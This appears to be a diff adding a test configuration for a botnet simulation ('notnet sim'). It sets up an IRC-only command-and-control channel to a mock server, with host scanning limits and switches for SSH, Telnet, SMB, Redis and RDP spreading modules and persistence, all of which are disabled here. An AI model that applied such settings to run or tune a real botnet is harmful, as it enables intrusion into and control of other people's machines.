@@ -1,0 +1,23 @@
+# notnet sim — remaining-parity scenario (S7): IRC-only C2 channel.
+# Tests the legacy IRC C2 end-to-end (heartbeats + commands over IRC).
+# HTTP/WS explicitly disabled so IRC is the ONLY channel (auto-detect would
+# otherwise enable HTTP when http_port != default).
+irc_enabled=1
+irc_server=c2-irc
+irc_port=6667
+irc_channel=#notnet
+irc_auth_nicks=mockirc
+http_enabled=0
+ws_enabled=0
+c2_secret=mocksecret
+heartbeat_interval=2
+scan_interval=1
+scan_timeout_ms=50
+scan_max_hosts=254
+ssh_enabled=0
+telnet_enabled=0
+smb_enabled=0
+redis_enabled=0
+rdp_enabled=0
+persist_enabled=0
+bot_tag=sim-irc-1
